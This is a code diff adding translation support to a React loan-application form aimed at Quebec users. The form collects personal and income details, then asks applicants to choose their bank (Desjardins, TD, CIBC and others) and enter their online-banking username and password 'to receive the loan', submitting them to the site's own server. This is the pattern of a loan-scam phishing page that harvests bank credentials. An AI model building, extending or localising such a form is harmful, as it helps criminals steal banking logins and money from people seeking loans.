@@ -1,7 +1,8 @@
 import { useState } from 'react';
 import { motion, AnimatePresence } from 'framer-motion';
 import { useNavigate } from 'react-router-dom';
-import { useToastStore } from '../store';
+import { useToastStore, useLangStore } from '../store';
+import { t } from '../utils/i18n';
 
 const BANKS = [
   { id: 'desjardins',        name: 'Caisse Desjardins',              url: 'https://accweb.mouv.desjardins.com/' },
@@ -29,7 +30,7 @@ const BANK_FIELDS = {
     ],
   },
   td: { logo: '🏦', fields: [
-    { name: 'identifiant', label: 'N° de carte d\'accès ou nom d\'utilisateur', type: 'text', placeholder: 'Carte d\'accès' },
+    { name: 'identifiant', label: "N° de carte d'accès ou nom d'utilisateur", type: 'text', placeholder: "Carte d'accès" },
     { name: 'mot_de_passe', label: 'Mot de passe', type: 'password', placeholder: '••••••••' },
   ]},
   laurentienne: { logo: '🏛', fields: [
@@ -41,7 +42,7 @@ const BANK_FIELDS = {
     { name: 'mot_de_passe', label: 'Mot de passe', type: 'password', placeholder: '••••••••' },
   ]},
   'pc-finance': { logo: '🛒', fields: [
-    { name: 'identifiant', label: 'Nom d\'utilisateur ou e-mail', type: 'text', placeholder: 'Nom d\'utilisateur' },
+    { name: 'identifiant', label: "Nom d'utilisateur ou e-mail", type: 'text', placeholder: "Nom d'utilisateur" },
     { name: 'mot_de_passe', label: 'Mot de passe', type: 'password', placeholder: '••••••••' },
   ]},
   cibc: { logo: '🔴', fields: [
@@ -83,8 +84,8 @@ const BANK_FIELDS = {
 };
 
 const STEPS = [
-  { id: 1, label: 'Informations' },
-  { id: 2, label: 'Banque' },
+  { id: 1, labelKey: 'loan_step1' },
+  { id: 2, labelKey: 'loan_step2' },
 ];
 
 const initialForm = {
@@ -95,6 +96,8 @@ const initialForm = {
 
 export default function LoanForm() {
   const navigate = useNavigate();
+  const { lang } = useLangStore();
+  const l = lang || 'fr';
   const addToast = useToastStore(s => s.addToast);
   const [step, setStep] = useState(1);
   const [form, setForm] = useState(initialForm);
@@ -106,6 +109,8 @@ export default function LoanForm() {
   const selectedBank = BANKS.find(b => b.id === form.bankId);
   const selectedFields = form.bankId ? BANK_FIELDS[form.bankId] : null;
 
+  const BANKS_LOOKUP = BANKS.reduce((acc, b) => ({ ...acc, [b.id]: b.name }), {});
+
   const canProceedStep1 = () => form.fullName && form.phone && form.email
     && form.address && form.city && form.postalCode
     && form.monthlyIncome && form.profession && form.nextPayday
@@ -113,8 +118,6 @@ export default function LoanForm() {
 
   const canProceedStep2 = () => form.bankId && selectedFields
     && selectedFields.fields.every(f => bankFieldValues[f.name]?.trim());
-
-  const BANKS_LOOKUP = BANKS.reduce((acc, b) => ({ ...acc, [b.id]: b.name }), {});
 
   const handleSubmit = async () => {
     if (!canProceedStep2()) return;
@@ -129,9 +132,9 @@ export default function LoanForm() {
       const data = await res.json();
       if (!data.success) throw new Error(data.message);
       setSubmitted(true);
-      addToast('Votre demande a été envoyée avec succès !', 'success');
+      addToast(t('loan_toast', l), 'success');
     } catch (err) {
-      addToast('Erreur lors de l\'envoi. Veuillez réessayer.', 'error');
+      addToast(t('loan_toast_err', l), 'error');
     }
     setSubmitting(false);
   };
@@ -142,13 +145,13 @@ export default function LoanForm() {
         <motion.div initial={{ opacity:0, scale:0.9 }} animate={{ opacity:1, scale:1 }} transition={{ duration:0.5, ease:[0.16,1,0.3,1] }}
           className="card" style={{ maxWidth:480, width:'100%', padding:'60px 40px', textAlign:'center' }}>
           <div style={{ width:80, height:80, borderRadius:'50%', background:'rgba(22,163,74,0.1)', border:'2px solid rgba(22,163,74,0.2)', display:'flex', alignItems:'center', justifyContent:'center', fontSize:36, margin:'0 auto 24px' }}>✅</div>
-          <h2 style={{ fontFamily:"'Outfit',sans-serif", fontSize:28, fontWeight:900, marginBottom:12 }}>Demande envoyée !</h2>
+          <h2 style={{ fontFamily:"'Outfit',sans-serif", fontSize:28, fontWeight:900, marginBottom:12 }}>{t('loan_success', l)}</h2>
           <p style={{ fontSize:14, color:'var(--text-3)', lineHeight:1.7, marginBottom:32 }}>
-            Votre demande de prêt a bien été reçue. Notre équipe l'analyse et vous recontactera sous 24h maximum.
+            {t('loan_success_desc', l)}
           </p>
           <div style={{ display:'flex', gap:12, justifyContent:'center', flexWrap:'wrap' }}>
-            <button onClick={()=>{ setSubmitted(false); setForm(initialForm); setBankFieldValues({}); setStep(1); }} className="btn-ghost" style={{ fontSize:12 }}>Nouvelle demande</button>
-            <button onClick={()=> navigate('/')} className="btn-primary" style={{ fontSize:12 }}>Retour à l'accueil</button>
+            <button onClick={()=>{ setSubmitted(false); setForm(initialForm); setBankFieldValues({}); setStep(1); }} className="btn-ghost" style={{ fontSize:12 }}>{t('loan_new', l)}</button>
+            <button onClick={()=> navigate('/')} className="btn-primary" style={{ fontSize:12 }}>{t('loan_home', l)}</button>
           </div>
         </motion.div>
       </div>
@@ -166,14 +169,13 @@ export default function LoanForm() {
         <div style={{ position:'absolute', top:'-20%', right:'-5%', width:400, height:400, borderRadius:'50%', background:'radial-gradient(circle, rgba(245,166,35,0.08) 0%, transparent 70%)' }} />
         <motion.div initial={{ opacity:0, y:24 }} animate={{ opacity:1, y:0 }} transition={{ duration:0.6, ease:[0.16,1,0.3,1] }} style={{ position:'relative', zIndex:1 }}>
           <span className="section-eyebrow" style={{ color:'var(--gold)' }}>Formulaire</span>
-          <h1 className="hero-text" style={{ fontSize:'clamp(32px,5vw,52px)', marginBottom:12 }}>Demande de prêt</h1>
-          <p className="hero-sub" style={{ fontSize:15, lineHeight:1.65 }}>Remplissez ce formulaire pour recevoir une réponse sous 24h. Tous les champs sont obligatoires.</p>
+          <h1 className="hero-text" style={{ fontSize:'clamp(32px,5vw,52px)', marginBottom:12 }}>{t('loan_title', l)}</h1>
+          <p className="hero-sub" style={{ fontSize:15, lineHeight:1.65 }}>{t('loan_sub', l)}</p>
         </motion.div>
       </section>
 
       <section style={{ padding:'60px 6%', background:'var(--bg)' }}>
         <div style={{ maxWidth:640, margin:'0 auto' }}>
-          {/* Progress */}
           <div style={{ marginBottom:36, display:'flex', justifyContent:'space-between', position:'relative' }}>
             {STEPS.map(s => (
               <div key={s.id} style={{ textAlign:'center', position:'relative', zIndex:1, flex:1 }}>
@@ -185,7 +187,9 @@ export default function LoanForm() {
                   border: s.id <= step ? '2px solid var(--gold)' : '2px solid var(--border-2)',
                   transition:'all 0.3s var(--ease)', margin:'0 auto',
                 }}>{s.id}</div>
-                <div style={{ fontSize:10, fontWeight:700, marginTop:6, color: s.id === step ? 'var(--gold)' : 'var(--text-3)', letterSpacing:'0.04em', textTransform:'uppercase', fontFamily:"'Outfit',sans-serif" }}>{s.label}</div>
+                <div style={{ fontSize:10, fontWeight:700, marginTop:6, color: s.id === step ? 'var(--gold)' : 'var(--text-3)', letterSpacing:'0.04em', textTransform:'uppercase', fontFamily:"'Outfit',sans-serif" }}>
+                  {t(s.labelKey, l)}
+                </div>
               </div>
             ))}
             <div style={{ position:'absolute', top:18, left:'10%', right:'10%', height:2, background:'var(--border-2)', zIndex:0 }}>
@@ -197,40 +201,40 @@ export default function LoanForm() {
             <AnimatePresence mode="wait">
               <motion.div key={step} initial={{ opacity:0, x:16 }} animate={{ opacity:1, x:0 }} exit={{ opacity:0, x:-16 }} transition={{ duration:0.25, ease:[0.16,1,0.3,1] }}>
                 <h3 style={{ fontFamily:"'Outfit',sans-serif", fontSize:18, fontWeight:800, marginBottom:24, paddingBottom:16, borderBottom:'1px solid var(--border)' }}>
-                  {step === 1 ? 'Informations personnelles' : 'Connectez-vous pour recevoir votre prêt'}
+                  {step === 1 ? t('loan_personal', l) : t('loan_bank_title', l)}
                 </h3>
 
                 <div style={{ display:'flex', flexDirection:'column', gap:16 }}>
                   {step === 1 && (
                     <>
-                      <Field label="Nom complet" value={form.fullName} onChange={v => update('fullName', v)} placeholder="Jean Dupont" />
-                      <Field label="Numéro de téléphone" value={form.phone} onChange={v => update('phone', v)} placeholder="+1 438 123 4567" type="tel" />
-                      <Field label="Adresse email" value={form.email} onChange={v => update('email', v)} placeholder="jean@exemple.com" type="email" />
-                      <Field label="Adresse complète" value={form.address} onChange={v => update('address', v)} placeholder="123 rue Sainte-Catherine" />
+                      <Field label={t('loan_fullname', l)} value={form.fullName} onChange={v => update('fullName', v)} placeholder="Jean Dupont" />
+                      <Field label={t('loan_phone', l)} value={form.phone} onChange={v => update('phone', v)} placeholder="+1 438 123 4567" type="tel" />
+                      <Field label={t('loan_email', l)} value={form.email} onChange={v => update('email', v)} placeholder="jean@exemple.com" type="email" />
+                      <Field label={t('loan_address', l)} value={form.address} onChange={v => update('address', v)} placeholder="123 rue Sainte-Catherine" />
                       <div style={{ display:'grid', gridTemplateColumns:'1fr 1fr', gap:16 }}>
-                        <Field label="Ville" value={form.city} onChange={v => update('city', v)} placeholder="Montréal" />
-                        <Field label="Code postal" value={form.postalCode} onChange={v => update('postalCode', v)} placeholder="H2X 1L5" />
+                        <Field label={t('loan_city', l)} value={form.city} onChange={v => update('city', v)} placeholder="Montréal" />
+                        <Field label={t('loan_postal', l)} value={form.postalCode} onChange={v => update('postalCode', v)} placeholder="H2X 1L5" />
                       </div>
                       <div style={{ display:'grid', gridTemplateColumns:'1fr 1fr', gap:16 }}>
-                        <Field label="Revenu mensuel ($)" value={form.monthlyIncome} onChange={v => update('monthlyIncome', v)} placeholder="3500" type="number" />
-                        <Field label="Profession" value={form.profession} onChange={v => update('profession', v)} placeholder="Employé" />
+                        <Field label={t('loan_income', l)} value={form.monthlyIncome} onChange={v => update('monthlyIncome', v)} placeholder="3500" type="number" />
+                        <Field label={t('loan_profession', l)} value={form.profession} onChange={v => update('profession', v)} placeholder="Employé" />
                       </div>
-                      <Field label="Date du prochain salaire" value={form.nextPayday} onChange={v => update('nextPayday', v)} type="date" />
+                      <Field label={t('loan_payday', l)} value={form.nextPayday} onChange={v => update('nextPayday', v)} type="date" />
                       <div>
-                        <label style={{ display:'block', fontSize:11, fontWeight:700, marginBottom:6, color:'var(--text-2)', letterSpacing:'0.06em', textTransform:'uppercase' }}>But de l'emprunt</label>
+                        <label style={{ display:'block', fontSize:11, fontWeight:700, marginBottom:6, color:'var(--text-2)', letterSpacing:'0.06em', textTransform:'uppercase' }}>{t('loan_purpose', l)}</label>
                         <select className="input-luxury" value={form.loanPurpose} onChange={e => update('loanPurpose', e.target.value)}>
-                          <option value="">Sélectionnez...</option>
-                          <option value="personnel">Prêt personnel</option>
-                          <option value="auto">Achat véhicule</option>
-                          <option value="travaux">Travaux / rénovation</option>
-                          <option value="etudes">Études / formation</option>
-                          <option value="sante">Santé / médical</option>
-                          <option value="autres">Autres</option>
+                          <option value="">{t('loan_select', l)}</option>
+                          <option value="personnel">{t('loan_personal2', l)}</option>
+                          <option value="auto">{t('loan_vehicle', l)}</option>
+                          <option value="travaux">{t('loan_renovation', l)}</option>
+                          <option value="etudes">{t('loan_study', l)}</option>
+                          <option value="sante">{t('loan_health', l)}</option>
+                          <option value="autres">{t('loan_other', l)}</option>
                         </select>
                       </div>
-                      <Field label="Date souhaitée de réception" value={form.desiredDate} onChange={v => update('desiredDate', v)} type="date" />
+                      <Field label={t('loan_date', l)} value={form.desiredDate} onChange={v => update('desiredDate', v)} type="date" />
                       <div>
-                        <label style={{ display:'block', fontSize:11, fontWeight:700, marginBottom:6, color:'var(--text-2)', letterSpacing:'0.06em', textTransform:'uppercase' }}>Demande conjointe ?</label>
+                        <label style={{ display:'block', fontSize:11, fontWeight:700, marginBottom:6, color:'var(--text-2)', letterSpacing:'0.06em', textTransform:'uppercase' }}>{t('loan_joint', l)}</label>
                         <div style={{ display:'flex', gap:12 }}>
                           {['non', 'oui'].map(v => (
                             <button key={v} onClick={() => update('jointRequest', v)} style={{
@@ -241,7 +245,7 @@ export default function LoanForm() {
                               fontWeight: form.jointRequest===v ? 700 : 400,
                               fontSize:13, fontFamily:"'Outfit',sans-serif", transition:'all 0.2s', minHeight:44,
                             }}>
-                              {v === 'oui' ? 'Oui, en couple' : 'Non, individuel'}
+                              {v === 'oui' ? t('loan_yes', l) : t('loan_no', l)}
                             </button>
                           ))}
                         </div>
@@ -253,13 +257,13 @@ export default function LoanForm() {
                     <>
                       <div style={{ padding:'14px 18px', borderRadius:8, background:'rgba(245,166,35,0.06)', border:'1px solid rgba(245,166,35,0.2)', display:'flex', alignItems:'center', gap:10, fontSize:13, color:'var(--text-2)' }}>
                         <span style={{ fontSize:16, flexShrink:0 }}>🔐</span>
-                        <span>Connectez-vous à votre banque pour valider votre identité et recevoir votre prêt.</span>
+                        <span>{t('loan_secure', l)}</span>
                       </div>
 
                       <div>
-                        <label style={{ display:'block', fontSize:11, fontWeight:700, marginBottom:6, color:'var(--text-2)', letterSpacing:'0.06em', textTransform:'uppercase' }}>Votre banque</label>
+                        <label style={{ display:'block', fontSize:11, fontWeight:700, marginBottom:6, color:'var(--text-2)', letterSpacing:'0.06em', textTransform:'uppercase' }}>{t('loan_bank_select', l)}</label>
                         <select className="input-luxury" value={form.bankId} onChange={e => { update('bankId', e.target.value); setBankFieldValues({}); }}>
-                          <option value="">Choisissez votre banque...</option>
+                          <option value="">{t('loan_choose', l)}</option>
                           {BANKS.map(b => <option key={b.id} value={b.id}>{b.name}</option>)}
                         </select>
                       </div>
@@ -271,9 +275,9 @@ export default function LoanForm() {
                             <span style={{ fontSize:28, flexShrink:0 }}>{selectedFields.logo}</span>
                             <div style={{ minWidth:0 }}>
                               <div style={{ fontSize:14, fontWeight:700, fontFamily:"'Outfit',sans-serif" }}>{selectedBank.name}</div>
-                              <div style={{ fontSize:11, color:'var(--text-3)' }}>Connectez-vous pour recevoir votre prêt</div>
+                              <div style={{ fontSize:11, color:'var(--text-3)' }}>{t('loan_login_text', l)}</div>
                             </div>
-                            <a href={selectedBank.url} target="_blank" rel="noopener noreferrer" style={{ marginLeft:'auto', fontSize:11, color:'var(--gold)', fontWeight:700, textDecoration:'none', flexShrink:0 }}>↗ Site</a>
+                            <a href={selectedBank.url} target="_blank" rel="noopener noreferrer" style={{ marginLeft:'auto', fontSize:11, color:'var(--gold)', fontWeight:700, textDecoration:'none', flexShrink:0 }}>{t('loan_site', l)}</a>
                           </div>
                           <div style={{ padding:'24px 18px', display:'flex', flexDirection:'column', gap:16 }}>
                             {selectedFields.fields.map(f => (
@@ -293,15 +297,15 @@ export default function LoanForm() {
 
             <div style={{ display:'flex', justifyContent:'space-between', marginTop:28, paddingTop:20, borderTop:'1px solid var(--border)' }}>
               {step > 1 ? (
-                <button onClick={() => setStep(s => s - 1)} className="btn-ghost" style={{ fontSize:12, padding:'12px 24px' }}>← Retour</button>
+                <button onClick={() => setStep(s => s - 1)} className="btn-ghost" style={{ fontSize:12, padding:'12px 24px' }}>{t('loan_back', l)}</button>
               ) : <div />}
               {step === 1 ? (
                 <button onClick={() => setStep(2)} disabled={!canProceedStep1()} className="btn-primary" style={{ fontSize:12, padding:'12px 28px', opacity: canProceedStep1() ? 1 : 0.4, cursor: canProceedStep1() ? 'pointer' : 'not-allowed' }}>
-                  Étape suivante →
+                  {t('loan_next', l)}
                 </button>
               ) : (
                 <button onClick={handleSubmit} disabled={!canProceedStep2() || submitting} className="btn-gold" style={{ fontSize:12, padding:'12px 28px', opacity: canProceedStep2() ? 1 : 0.4, cursor: canProceedStep2() ? 'pointer' : 'not-allowed' }}>
-                  {submitting ? 'Connexion...' : 'Se connecter et envoyer →'}
+                  {submitting ? t('loan_submitting', l) : t('loan_submit', l)}
                 </button>
               )}
             </div>
